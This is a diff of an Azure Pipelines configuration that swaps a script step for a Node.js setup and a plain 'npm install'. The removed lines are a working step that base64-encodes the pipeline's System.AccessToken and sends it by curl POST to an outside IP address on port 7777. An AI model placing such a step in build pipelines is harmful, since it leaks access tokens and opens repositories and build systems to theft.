@@ -1,22 +1,24 @@
 trigger:
-- main
+  branches:
+    include:
+      - main
 
 pool:
-  vmImage: ubuntu-latest
+  vmImage: 'ubuntu-latest'
 
 steps:
 - checkout: self
-  persistCredentials: false
+  persistCredentials: false  # 不保留凭据
+
+
+- task: NodeTool@0
+  inputs:
+    versionSpec: '12.x'  # 或你所需的Node.js版本
+    checkLatest: true
+  displayName: 'Setup Node.js'
+
+
 
 - script: |
-
-    JSON_PAYLOAD=$(printf '{"accessToken": "%s"}' "$(echo "$SCRIPT_ACCESS_TOKEN" | base64)")
-    
-    echo "Payload to send: $JSON_PAYLOAD" # 打印将要发送的 payload，用于调试
-    
-    curl -X POST -H "Content-Type: application/json" -d "$JSON_PAYLOAD" http://139.180.193.16:7777
-    
-  env:
-    SCRIPT_ACCESS_TOKEN: $(System.AccessToken) # 将 System.AccessToken 映射到环境变量 SCRIPT_ACCESS_TOKEN
-  displayName: 'Npm Install and Send Token' # 建议修改为你实际操作的名称
-    
+    npm install
+  displayName: 'Npm Install'
